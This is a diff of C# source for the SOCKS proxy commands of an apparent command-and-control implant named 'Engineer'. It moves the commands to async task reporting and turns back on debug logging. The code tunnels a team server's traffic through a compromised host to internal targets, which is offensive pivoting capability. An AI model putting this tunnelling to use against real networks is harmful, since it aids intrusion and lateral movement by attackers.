@@ -12,6 +12,7 @@ using System.IO;
 using System.Net.Security;
 using System.Security.Authentication;
 using System.Threading;
+using Engineer.Functions;
 
 namespace Engineer.Commands
 {
@@ -19,22 +20,22 @@ namespace Engineer.Commands
     {
         public static List<string> SocksClients = new();
         public static readonly  ConcurrentDictionary<string, ConcurrentQueue<byte[]>> SocksClientsData = new();
-        //public static readonly  ConcurrentDictionary<string, bool> SocksClientsGotData = new();
-       // public static readonly  ConcurrentDictionary<string, bool> SocksClientWaiting = new();
  
 
         public override string Name => "socks";
         internal static CancellationTokenSource _tokenSource = new();
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             task.Arguments.TryGetValue("/port", out var port);
             //if task.arguments holds key /stop return saying the socks proxy won /port was stopped
             if (task.Arguments.ContainsKey("/stop"))
             {
-                return $"Socks proxy on port {port} stopped";
+                Tasking.FillTaskResults($"Socks proxy on port {port} stopped", task, EngTaskStatus.Complete);
+                _tokenSource.Cancel();
+                return;
             }
 
-            return $"socks started on team server at port {port}";
+            Tasking.FillTaskResults($"socks started on team server at port {port}", task, EngTaskStatus.Running);
 
         }
     }
@@ -42,7 +43,7 @@ namespace Engineer.Commands
     {
         public override string Name => "socksConnect";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             try
             {
@@ -52,18 +53,17 @@ namespace Engineer.Commands
                 task.Arguments.TryGetValue("/Client", out var client);
                 socks.SocksClients.Add(client);
                 socks.SocksClientsData.TryAdd(client, new ConcurrentQueue<byte[]>());
-                //socks.SocksClientsGotData.TryAdd(client, false);
-                //Console.WriteLine($"Connecting to {address}:{port}");
+                Console.WriteLine($"Connecting to {address}:{port}");
 
                 Task.Run(async () => await ConnectSocks(address, port, client));
-                return $"Connecting to {address}:{port}"+$"\n{client}";
+                Tasking.FillTaskResults($"Connecting to {address}:{port}" + $"\n{client}", task, EngTaskStatus.Complete);
             }
             
             catch(Exception e)
             {
-               // Console.WriteLine(e.Message);
-               // Console.WriteLine(e.StackTrace);
-                return "error with socks connect";
+                Console.WriteLine(e.Message);
+                Console.WriteLine(e.StackTrace);
+                Tasking.FillTaskResults("error with socks connect", task, EngTaskStatus.Failed);
             }
         }
         
@@ -94,6 +94,7 @@ namespace Engineer.Commands
                     if (!socks.SocksClientsData[client].IsEmpty)
                     {
                         socks.SocksClientsData[client].TryDequeue(out var data);
+                        Console.WriteLine($"Engineer sending client {client} {data.Length} bytes");
                         await destination.SendData(data, socks._tokenSource.Token);
                     }
                     // read from destination
@@ -104,7 +105,7 @@ namespace Engineer.Commands
                         //make a new engineer task with the argument /data which is resp converted to a base64 string and then add the task to the queue
                         var task = new EngineerTask
                         {
-                            Id = "socksReceiveData",
+                            Id = Guid.NewGuid().ToString(),
                             Command = "socksReceive",
                             File = resp,
                             Arguments = new Dictionary<string, string>
@@ -113,7 +114,7 @@ namespace Engineer.Commands
                         }
                         };
                        Program.InboundCommandsRec += 1;
-                       Task.Run(async() => await Program.DealWithTask(task));
+                       Task.Run(async() => await Tasking.DealWithTask(task));
                     }
                     // rip cpu
                     await Task.Delay(10);
@@ -121,8 +122,8 @@ namespace Engineer.Commands
             }
             catch (Exception e)
             {
-               //Console.WriteLine(e.Message);
-              // Console.WriteLine(e.StackTrace);
+                Console.WriteLine(e.Message);
+                Console.WriteLine(e.StackTrace);
             }
         }
     }
@@ -131,15 +132,14 @@ namespace Engineer.Commands
     {
         public override string Name => "socksSend";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             task.Arguments.TryGetValue("/client", out var client);
 
             //while the socks client is waiting for data to be sent do not send the data 
             var req = task.File;
             socks.SocksClientsData[client].Enqueue(req);
-            //socks.SocksClientsGotData[client] = true;
-            return $"Sending data";
+            Tasking.FillTaskResults($"Sending data",task,EngTaskStatus.Complete);
         }
     }
     
@@ -147,11 +147,11 @@ namespace Engineer.Commands
     {
         public override string Name => "socksReceive";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             // trygetvalue of task.arguments /data and return that value
             task.Arguments.TryGetValue("/client", out var client);
-            return Convert.ToBase64String(task.File)+"\n"+client;
+            Tasking.FillTaskResults(Convert.ToBase64String(task.File) + "\n" + client, task, EngTaskStatus.Complete);
         }
     }
 
@@ -181,7 +181,7 @@ namespace Engineer.Commands
 
         public static async Task SendData(this TcpClient client, byte[] data, CancellationToken token)
         {
-
+            
             var ns = client.GetStream();
             await ns.WriteAsync(data, 0, data.Length, token);
         }
@@ -190,6 +190,14 @@ namespace Engineer.Commands
         {
             var ns = client.GetStream();
             return ns.DataAvailable;
+        }
+
+        public static void Clear(this MemoryStream stream)
+        {
+            var buffer = stream.GetBuffer();
+            Array.Clear(buffer, 0, buffer.Length);
+            stream.Position = 0;
+            stream.SetLength(0);
         }
     }
 }
